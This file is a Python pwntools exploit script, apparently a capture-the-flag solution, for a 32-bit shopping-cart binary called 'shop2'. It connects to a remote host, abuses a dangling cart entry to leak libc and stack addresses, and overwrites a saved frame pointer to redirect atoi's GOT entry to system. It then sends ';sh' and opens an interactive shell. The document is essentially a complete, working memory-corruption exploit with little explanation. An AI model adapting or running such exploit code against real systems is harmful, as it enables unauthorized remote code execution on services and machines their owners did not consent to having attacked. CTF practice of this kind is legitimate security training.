#!/usr/bin/env python 
from pwn import *

LOCAL = False
Debug = False

lib = ELF('./libc.so.6.32')
      
def L(msg):
    if Debug:
        print msg

if not LOCAL:
    r = remote('172.16.113.50', 12020)
else:
    r = process('./shop2')
    L(r.proc.pid)
    a = raw_input('Wait gdb attach...\n')

'''
 Arch:     i386-32-little
 RELRO:    Partial RELRO
 Stack:    Canary found
 NX:       NX enabled
 PIE:      No PIE (0x8048000)
'''

def add(device_number):
    L(r.recvuntil('>'))
    r.send('2')
    L(r.recvuntil('>'))
    r.send(device_number)

def checkout(s):
    L(r.recvuntil('>'))
    r.send('5')
    L(r.recvuntil('>'))
    r.send(s)    
    
def cart(s):
    L(r.recvuntil('>'))
    r.send('4')
    L(r.recvuntil('>'))
    r.send(s)
    
def delete(number):
    L(r.recvuntil('>'))
    r.send('3')
    L(r.recvuntil('>'))
    r.send(number)

def leak(add):
    cart('y '+ p32(add) + p32(1) + p32(0)*2)

    res = r.recvuntil('$1\n')
    L(res)
    res_add = res.split('2: ')[1].split(' -')[0]
    res_add = u32(res_add.ljust(4,'\x00')[:4])
    return res_add

if __name__ == "__main__":
    
    myCart_8 = 0x804b070
    atoi_plt = 0x804b040
    
    # 399*10 + 199*16 = 7174
    for i in range(16):
        add('1')
    for i in range(10):
        add('4')
    checkout('y')

    for i in range(25): # not need
        delete('1')

    # find system address 
    atoi_add = leak(atoi_plt)
    lib_base =  atoi_add - lib.symbols['atoi']
    sys_add = lib_base + lib.symbols['system']
   
    myCart_add = leak(myCart_8)
    buf_add = leak(myCart_add+0x8)

    print '[*] atoi_plt =', hex(atoi_plt)        
    print '[*] atoi_addr =', hex(atoi_add)
    print '[*] myCart_add =',hex(0x804b070)
    print '[*] myCart1st_add =',hex(myCart_add)
    print '[*] buf_add =',hex(buf_add)
    print '[*] main_ebp =', hex(buf_add+0x20)
    
    # overwrite EBP so after delete end ebp will change, and because the buf in handler is ebp-0x22, so we can overwrite somewhere we need
    #                               EBP                    atoi+0x22
    delete('2 '+ p32(0)*2 + p32(buf_add+0x20-0xc) + p32(atoi_plt+0x22))
    
    # write system to ebp-0x22 = (atoi+0x22)-0x22 
    r.send(p32(sys_add)+';sh\x00')

    r.interactive()



